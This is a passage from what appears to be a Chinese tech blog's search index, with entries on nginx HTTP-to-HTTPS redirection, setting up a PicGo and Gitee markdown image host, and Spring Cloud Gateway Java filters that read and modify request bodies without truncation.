class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://test.com/&quot;&gt;  </span><br><span class="line">&lt;/html&gt;  </span><br><span class="line">server &#123;  </span><br><span class="line">    listen 192.168.1.11:80;  </span><br><span class="line">    server_name test.com;  </span><br><span class="line">        </span><br><span class="line">    location / &#123;  </span><br><span class="line">                #index.html放在虚拟主机监听的根目录下  </span><br><span class="line">        root /srv/www/http.test.com/;  </span><br><span class="line">    &#125;  </span><br><span class="line">        #将404的页面重定向到https的首页  </span><br><span class="line">    error_page  404 https://test.com/;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h2 id="反向HTTPS转发到内部HTTP"><a href="#反向HTTPS转发到内部HTTP" class="headerlink" title="反向HTTPS转发到内部HTTP"></a>反向HTTPS转发到内部HTTP</h2>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicGo + Gitee(码云)实现markdown图床</title>
      <link href="/PicGo+Gitee(%E7%A0%81%E4%BA%91)%E5%AE%9E%E7%8E%B0markdown%E5%9B%BE%E5%BA%8A/"/>
      <url>/PicGo+Gitee(%E7%A0%81%E4%BA%91)%E5%AE%9E%E7%8E%B0markdown%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<p>PicGo + Gitee(码云)实现markdown图床</p><a id="more"></a><p>效果图：</p><p><img src="https://img-blog.csdnimg.cn/20200922214917671.gif#pic_center"></p><h1 id="PicGo-Gitee-码云-实现markdown图床"><a href="#PicGo-Gitee-码云-实现markdown图床" class="headerlink" title="PicGo + Gitee(码云)实现markdown图床"></a>PicGo + Gitee(码云)实现markdown图床</h1><h2 id="PicGo-Gitee-码云-实现markdown图床-1"><a href="#PicGo-Gitee-码云-实现markdown图床-1" class="headerlink" title="PicGo + Gitee(码云)实现markdown图床"></a>PicGo + Gitee(码云)实现markdown图床</h2><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><ul><li>PicGo</li><li>picgo-plugin-gitee-uploader插件</li></ul><h3 id="首先打开picgo官网，下载安装包"><a href="#首先打开picgo官网，下载安装包" class="headerlink" title="首先打开picgo官网，下载安装包"></a>首先打开<a href="https://link.zhihu.com/?target=https://github.com/Molunerfinn/PicGo">picgo官网</a>，下载安装包</h3><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/v2-6a5d78ebb1910843ff4d2872580d21a5_720w.png" alt="img"></p><p>如果速度慢，点击此地址下载：</p><p>mac:  <a href="https://gschaos.club/down/PicGo-2.3.0-beta.3-mac.zip">https://gschaos.club/down/PicGo-2.3.0-beta.3-mac.zip</a></p><p>win:  <a href="https://gschaos.club/down/PicGo-Setup-2.3.0-beta.3.exe">https://gschaos.club/down/PicGo-Setup-2.3.0-beta.3.exe</a></p><h3 id="安装之后打开主界面"><a href="#安装之后打开主界面" class="headerlink" title="安装之后打开主界面"></a>安装之后打开主界面</h3><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911093623043.png" alt="image-20200911093623043"></p><h3 id="选择最底下的插件设置，搜索gitee"><a href="#选择最底下的插件设置，搜索gitee" class="headerlink" title="选择最底下的插件设置，搜索gitee"></a>选择最底下的插件设置，搜索<strong>gitee</strong></h3><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911093648928.png" alt="image-20200911093648928"></p><h3 id="点击右边的gitee-uploader-1-1-2开始安装"><a href="#点击右边的gitee-uploader-1-1-2开始安装" class="headerlink" title="点击右边的gitee-uploader 1.1.2开始安装"></a>点击右边的gitee-uploader 1.1.2开始安装</h3><blockquote><p>这里注意一下，必须要先安装<a href="https://link.zhihu.com/?target=https://nodejs.org/en/">node.js</a>才能安装插件，没装的自己装一下，然后重启就行。</p></blockquote><hr><h2 id="2-建立图床库"><a href="#2-建立图床库" class="headerlink" title="2. 建立图床库"></a>2. 建立图床库</h2><h3 id="点击右上角的-号，新建仓库"><a href="#点击右上角的-号，新建仓库" class="headerlink" title="点击右上角的+号，新建仓库"></a>点击右上角的+号，新建仓库</h3><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911093729491.png" alt="image-20200911093729491"></p><p>新建仓库的要点如下：</p><ol><li>输入一个仓库名称</li><li>其次将仓库设为公开</li><li>勾选使用Readme文件初始化这个仓库</li></ol><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911135935950.png" alt="image-20200911135935950"></p><p>点击下一步完成创建</p><hr><h2 id="3-配置PicGo"><a href="#3-配置PicGo" class="headerlink" title="3. 配置PicGo"></a>3. 配置PicGo</h2><p>安装了<strong>gitee-uploader 1.1.2</strong>插件之后，我们开始配置插件</p><h3 id="配置插件的要点如下："><a href="#配置插件的要点如下：" class="headerlink" title="配置插件的要点如下："></a>配置插件的要点如下：</h3><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911093830243.png" alt="image-20200911093830243"></p><ul><li>repo：用户名/仓库名称，比如我自己的仓库MysticalYu/pic，找不到的可以直接复制仓库的url,<font color=red>复制浏览器的仓库地址，而不是页面左上角显示的，容易出现大小写问题</font></li></ul><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911093907929.png" alt="image-20200911093907929"></p><ul><li>branch：分支，这里写上master</li><li>token：填入码云的私人令牌</li><li>path：路径，一般写上img</li><li>customPath：提交消息，这一项和下一项customURL都不用填。在提交到码云后，会显示提交消息，插件默认提交的是 <code>Upload 图片名 by picGo - 时间</code></li></ul><h3 id="这个token怎么获取，下面登录进自己的码云"><a href="#这个token怎么获取，下面登录进自己的码云" class="headerlink" title="这个token怎么获取，下面登录进自己的码云"></a>这个token怎么获取，下面登录进自己的码云</h3><ol><li>点击头像，进入设置</li></ol><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/v2-09207edcefff7852c91abcc3df3c5ba0_720w.png" alt="img"></p><ol start="2"><li>找到右边安全设置里面的私人令牌</li></ol><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911093943588.png" alt="image-20200911093943588"></p><ol start="3"><li>点击<code>生成新令牌</code>，把<strong>projects</strong>这一项勾上，其他的不用勾，然后提交</li></ol><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911094009969.png" alt="image-20200911094009969"></p><p>这里需要验证一下密码，验证密码之后会出来一串数字，这一串数字就是你的token，将这串数字复制到刚才的配置里面去。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911094119173.png" alt="image-20200911094119173"></p><blockquote><p>注意：这个令牌只会明文显示一次，建议在配置插件的时候再来生成令牌，直接复制进去，搞丢了又要重新生成一个。</p></blockquote><h3 id="保存，完成即可。"><a href="#保存，完成即可。" class="headerlink" title="保存，完成即可。"></a>保存，完成即可。</h3><h3 id="4-将仓库配置成giteePage页"><a href="#4-将仓库配置成giteePage页" class="headerlink" title="4. 将仓库配置成giteePage页"></a>4. 将仓库配置成giteePage页</h3><p>我们需要通过链接来访问图片，这里将刚才建立的仓库设置成GiteePage页</p><ol><li>点击服务，选择Gitee Pages</li></ol><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911095044868.png" alt="image-20200911095044868"></p><ol start="2"><li>如果自己想使用Https的图片，比如自己的博客网站是支持SSL认证的话，可以勾选强制使用Https;    这里参考：<a href="https://www.gschaos.club/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%83%A8%E7%BD%B2SSL%E8%AF%81%E4%B9%A6%E5%90%8E%EF%BC%8C%E8%BF%98%E6%98%AF%E6%8F%90%E7%A4%BA%E4%B8%8D%E5%AE%89%E5%85%A8/">为什么部署SSL证书后还是提示不安全</a></li></ol><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911095640287.png" alt="image-20200911095640287"></p><p>开启成功后再次访问就会变成下面的页面，这里的更新间隔是一分钟，需要手动更新，当然也可以配置WebHook触发服务器钩子来调用API自动更新，这里不涉及这方面，不展开。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911095541779.png" alt="image-20200911095541779"></p><h3 id="这样我们就获得了一个可以访问的网址"><a href="#这样我们就获得了一个可以访问的网址" class="headerlink" title="这样我们就获得了一个可以访问的网址"></a>这样我们就获得了一个可以访问的网址</h3><p>通过这个网址和上面PicGo配置的Path组合就可以访问我们需要的图片的。类似这种：</p><p><a href="https://mysticalyu.gitee.io/pic/img/20200409141450-lee-gh-2.jpg">https://mysticalyu.gitee.io/pic/img/20200409141450-lee-gh-2.jpg</a></p><h2 id="Typora配置PicGo"><a href="#Typora配置PicGo" class="headerlink" title="Typora配置PicGo"></a>Typora配置PicGo</h2><p>**一个编写md文件的神器，官网地址：<a href="https://typora.io/">https://typora.io/</a> **  使用方法和基本配置见百度谷歌。</p><p>这里说明一下如何配置PicGo文件上传到服务器。</p><p>配置如下</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911094434501.png" alt="image-20200911094434501"></p><ol><li>配置好PigGo的执行文件</li><li>验证一下图片是否能上传成功</li></ol><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200911094603050.png" alt="image-20200911094603050"></p><p>这里可以选择插入图片的操作，比如直接上传服务器。</p><p>以上配置后，基本就可以实现自己的图床了。</p><h2 id="题外"><a href="#题外" class="headerlink" title="题外"></a>题外</h2><p>GiteePage读取的是仓库的index.html页面，所以我们可以下载一些画廊的模板来放在index页面，至于画廊如何读取上传的图片就自己琢磨吧。</p><p><font color=red>附上自己的画廊地址:<a href="https://www.gschaos.club/gallery/">https://www.gschaos.club/gallery/</a></font></p>]]></content>
      
      
      <categories>
          
          <category> 图床 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Gateway 读取、修改请求体（解决request body内容被截断）</title>
      <link href="/Spring%20Cloud%20Gateway%E6%88%AA%E6%96%AD/"/>
      <url>/Spring%20Cloud%20Gateway%E6%88%AA%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p>Spring Cloud Gateway 读取、修改请求体（解决request body内容被截断基于2.0.6版本，升级版本后可能不存在此问题）</p> <a id="more"></a><h1 id="Spring-Cloud-Gateway-读取、修改请求体（解决request-body内容被截断）"><a href="#Spring-Cloud-Gateway-读取、修改请求体（解决request-body内容被截断）" class="headerlink" title="Spring Cloud Gateway 读取、修改请求体（解决request body内容被截断）"></a>Spring Cloud Gateway 读取、修改请求体（解决request body内容被截断）</h1><p>本文涉及到的项目使用的版本如下：</p><p>Spring Boot：2.0.6.RELEASE</p><p>Spring Cloud：Finchley.SR2</p><h2 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h2><p>微服务架构，在网关服务里拦截每个请求，进行日志信息记录与管理，发现当请求体过长时，只能获取到一部分body，查看拦截过滤器，发现Spring Cloud Gateway是基于reactor-core.jar进行请求数据的操作，获取body内容时，用到了reactor-core.jar的Flux<DataBuffer>，即一个包含0-N个DataBuffer类型元素的同步序列。</p><p>之前尝试了网上多种写法，不管是使用subscribe还是block，都<strong>无效</strong></p><p>subscribe只会接收到第一个发出的元素，所以会导致获取不全，不管使用AtomicReference<String>还是StringBuilder来包装获取到的字符串，都无效。</p><p>翻看Spring Cloud Gateway包，会发现有个官方自带的修改请求体内容的过滤器工厂类：ModifyRequestBodyGatewayFilterFactory（对应的还有修改输出的body的过滤器工厂类）</p><p><img src="../images/storage/813379-20200320112210752-909358460.png" alt="img"></p><p> 但是因为要结合我们自己的业务逻辑，所以这个类我们无法直接使用，但是可以自己定义一个类似的过滤器。</p><p>正确写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">package cn.miao.gateway.filter;</span><br><span class="line"></span><br><span class="line">import lombok.extern.slf4j.Slf4j;</span><br><span class="line">import org.springframework.cloud.gateway.filter.GatewayFilter;</span><br><span class="line">import org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line">import org.springframework.cloud.gateway.support.BodyInserterContext;</span><br><span class="line">import org.springframework.cloud.gateway.support.CachedBodyOutputMessage;</span><br><span class="line">import org.springframework.cloud.gateway.support.DefaultServerRequest;</span><br><span class="line">import org.springframework.core.Ordered;</span><br><span class="line">import org.springframework.core.io.buffer.DataBuffer;</span><br><span class="line">import org.springframework.http.HttpHeaders;</span><br><span class="line">import org.springframework.http.HttpMethod;</span><br><span class="line">import org.springframework.http.MediaType;</span><br><span class="line">import org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line">import org.springframework.http.server.reactive.ServerHttpRequestDecorator;</span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line">import org.springframework.web.reactive.function.BodyInserter;</span><br><span class="line">import org.springframework.web.reactive.function.BodyInserters;</span><br><span class="line">import org.springframework.web.reactive.function.server.ServerRequest;</span><br><span class="line">import org.springframework.web.server.ServerWebExchange;</span><br><span class="line">import reactor.core.publisher.Flux;</span><br><span class="line">import reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line">@Slf4j</span><br><span class="line">@Component</span><br><span class="line">public class RequestBodyOperationFilter implements GatewayFilter, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123;</span><br><span class="line">        ServerHttpRequest request &#x3D; exchange.getRequest();</span><br><span class="line">        if (request.getMethod() !&#x3D; HttpMethod.POST) &#123;</span><br><span class="line">            return chain.filter(exchange);</span><br><span class="line">        &#125;</span><br><span class="line">        return operationExchange(exchange, chain);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private Mono&lt;Void&gt; operationExchange(ServerWebExchange exchange, GatewayFilterChain chain) &#123;</span><br><span class="line">        &#x2F;&#x2F; mediaType</span><br><span class="line">        MediaType mediaType &#x3D; exchange.getRequest().getHeaders().getContentType();</span><br><span class="line">        &#x2F;&#x2F; read &amp; modify body</span><br><span class="line">        ServerRequest serverRequest &#x3D; new DefaultServerRequest(exchange);</span><br><span class="line">        Mono&lt;String&gt; modifiedBody &#x3D; serverRequest.bodyToMono(String.class)</span><br><span class="line">                .flatMap(body -&gt; &#123;</span><br><span class="line">                    if (MediaType.APPLICATION_JSON.isCompatibleWith(mediaType)) &#123;</span><br><span class="line">                        &#x2F;&#x2F; 对原先的body进行修改操作</span><br><span class="line">                        String newBody &#x3D; &quot;&#123;\&quot;testName\&quot;:\&quot;testValue\&quot;&#125;&quot;;</span><br><span class="line">                        return Mono.just(newBody);</span><br><span class="line">                    &#125;</span><br><span class="line">                    return Mono.empty();</span><br><span class="line">                &#125;);</span><br><span class="line">        BodyInserter bodyInserter &#x3D; BodyInserters.fromPublisher(modifiedBody, String.class);</span><br><span class="line">        HttpHeaders headers &#x3D; new HttpHeaders();</span><br><span class="line">        headers.putAll(exchange.getRequest().getHeaders());</span><br><span class="line">        headers.remove(HttpHeaders.CONTENT_LENGTH);</span><br><span class="line">        CachedBodyOutputMessage outputMessage &#x3D; new CachedBodyOutputMessage(exchange, headers);</span><br><span class="line">        return bodyInserter.insert(outputMessage, new BodyInserterContext())</span><br><span class="line">                .then(Mono.defer(() -&gt; &#123;</span><br><span class="line">                    ServerHttpRequestDecorator decorator &#x3D; new ServerHttpRequestDecorator(</span><br><span class="line">                            exchange.getRequest()) &#123;</span><br><span class="line">                        @Override</span><br><span class="line">                        public HttpHeaders getHeaders() &#123;</span><br><span class="line">                            long contentLength &#x3D; headers.getContentLength();</span><br><span class="line">                            HttpHeaders httpHeaders &#x3D; new HttpHeaders();</span><br><span class="line">                            httpHeaders.putAll(super.getHeaders());</span><br><span class="line">                            if (contentLength &gt; 0) &#123;</span><br><span class="line">                                httpHeaders.setContentLength(contentLength);</span><br><span class="line">                            &#125; else &#123;</span><br><span class="line">                                httpHeaders.set(HttpHeaders.TRANSFER_ENCODING, &quot;chunked&quot;);</span><br><span class="line">                            &#125;</span><br><span class="line">                            return httpHeaders;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        @Override</span><br><span class="line">                        public Flux&lt;DataBuffer&gt; getBody() &#123;</span><br><span class="line">                            return outputMessage.getBody();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;;</span><br><span class="line">                    return chain.filter(exchange.mutate().request(decorator).build());</span><br><span class="line">                &#125;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int getOrder() &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原先body会被截断的写法A：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">package cn.miao.gateway.filter;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import io.netty.buffer.ByteBufAllocator;</span><br><span class="line">import lombok.extern.slf4j.Slf4j;</span><br><span class="line">import org.springframework.beans.factory.annotation.Value;</span><br><span class="line">import org.springframework.cloud.gateway.filter.GatewayFilter;</span><br><span class="line">import org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line">import org.springframework.core.Ordered;</span><br><span class="line">import org.springframework.core.io.buffer.DataBuffer;</span><br><span class="line">import org.springframework.core.io.buffer.DataBufferUtils;</span><br><span class="line">import org.springframework.core.io.buffer.NettyDataBufferFactory;</span><br><span class="line">import org.springframework.http.HttpHeaders;</span><br><span class="line">import org.springframework.http.HttpMethod;</span><br><span class="line">import org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line">import org.springframework.http.server.reactive.ServerHttpRequestDecorator;</span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line">import org.springframework.web.server.ServerWebExchange;</span><br><span class="line">import reactor.core.publisher.Flux;</span><br><span class="line">import reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line">import java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line">@Slf4j</span><br><span class="line">@Component</span><br><span class="line">public class RequestBodyOperationFilter implements GatewayFilter, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    @Value(&quot;$&#123;unified.request.sign.flag&#125;&quot;)</span><br><span class="line">    private boolean signFlag;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123;</span><br><span class="line">        ServerHttpRequest request &#x3D; exchange.getRequest();</span><br><span class="line">        &#x2F;&#x2F; 只拦截POST 请求</span><br><span class="line">        if (request.getMethod() !&#x3D; HttpMethod.POST) &#123;</span><br><span class="line">            return chain.filter(exchange);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 操作body</span><br><span class="line">        ServerHttpRequestDecorator serverHttpRequestDecorator &#x3D; requestDecorator(exchange);</span><br><span class="line">        return chain.filter(exchange.mutate().request(serverHttpRequestDecorator).build());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private ServerHttpRequestDecorator requestDecorator(ServerWebExchange exchange) &#123;</span><br><span class="line">        ServerHttpRequestDecorator serverHttpRequestDecorator &#x3D; new ServerHttpRequestDecorator(exchange.getRequest()) &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Flux&lt;DataBuffer&gt; getBody() &#123;</span><br><span class="line">                Flux&lt;DataBuffer&gt; body &#x3D; super.getBody();</span><br><span class="line">                return body.map(dataBuffer -&gt; &#123;</span><br><span class="line">                    byte[] content &#x3D; new byte[dataBuffer.readableByteCount()];</span><br><span class="line">                    dataBuffer.read(content);</span><br><span class="line">                    &#x2F;&#x2F;释放掉内存</span><br><span class="line">                    DataBufferUtils.release(dataBuffer);</span><br><span class="line">                    &#x2F;&#x2F;request body的json格式数据</span><br><span class="line">                    String bodyJson &#x3D; new String(content, Charset.forName(&quot;UTF-8&quot;));</span><br><span class="line">                    &#x2F;&#x2F;转化成json对象</span><br><span class="line">                    JSONObject jsonObject &#x3D; JSON.parseObject(bodyJson);</span><br><span class="line">                    &#x2F;&#x2F; 对原先的body进行修改操作</span><br><span class="line">                    jsonObject.put(&quot;testName&quot;, &quot;testValue&quot;);</span><br><span class="line"></span><br><span class="line">                    String result &#x3D; jsonObject.toJSONString();</span><br><span class="line">                    &#x2F;&#x2F;转成字节</span><br><span class="line">                    byte[] bytes &#x3D; result.getBytes();</span><br><span class="line">                    NettyDataBufferFactory nettyDataBufferFactory &#x3D; new NettyDataBufferFactory(ByteBufAllocator.DEFAULT);</span><br><span class="line">                    DataBuffer buffer &#x3D; nettyDataBufferFactory.allocateBuffer(bytes.length);</span><br><span class="line">                    buffer.write(bytes);</span><br><span class="line">                    return buffer;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;复写getHeaders方法</span><br><span class="line">            @Override</span><br><span class="line">            public HttpHeaders getHeaders() &#123;</span><br><span class="line">                HttpHeaders httpHeaders &#x3D; new HttpHeaders();</span><br><span class="line">                httpHeaders.putAll(super.getHeaders());</span><br><span class="line">                &#x2F;&#x2F;由于修改了请求体的body，导致content-length长度不确定，因此需要删除原先的content-length</span><br><span class="line">                httpHeaders.remove(HttpHeaders.CONTENT_LENGTH);</span><br><span class="line">                httpHeaders.set(HttpHeaders.TRANSFER_ENCODING, &quot;chunked&quot;);</span><br><span class="line">                return httpHeaders;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        return serverHttpRequestDecorator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int getOrder() &#123;</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原先body会被截断的写法B：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">package cn.miao.gateway.filter;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import io.netty.buffer.ByteBufAllocator;</span><br><span class="line">import lombok.extern.slf4j.Slf4j;</span><br><span class="line">import org.springframework.cloud.gateway.filter.GatewayFilter;</span><br><span class="line">import org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line">import org.springframework.core.Ordered;</span><br><span class="line">import org.springframework.core.io.buffer.DataBuffer;</span><br><span class="line">import org.springframework.core.io.buffer.DataBufferUtils;</span><br><span class="line">import org.springframework.core.io.buffer.NettyDataBufferFactory;</span><br><span class="line">import org.springframework.http.HttpMethod;</span><br><span class="line">import org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line">import org.springframework.http.server.reactive.ServerHttpRequestDecorator;</span><br><span class="line">import org.springframework.stereotype.Component;</span><br><span class="line">import org.springframework.web.server.ServerWebExchange;</span><br><span class="line">import org.springframework.web.util.UriComponentsBuilder;</span><br><span class="line">import reactor.core.publisher.Flux;</span><br><span class="line">import reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line">import java.net.URI;</span><br><span class="line">import java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line">@Slf4j</span><br><span class="line">@Component</span><br><span class="line">public class RequestBodyOperationFilter implements GatewayFilter, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123;</span><br><span class="line">        ServerHttpRequest request &#x3D; exchange.getRequest();</span><br><span class="line">        if (request.getMethod() !&#x3D; HttpMethod.POST) &#123;</span><br><span class="line">            return chain.filter(exchange);</span><br><span class="line">        &#125;</span><br><span 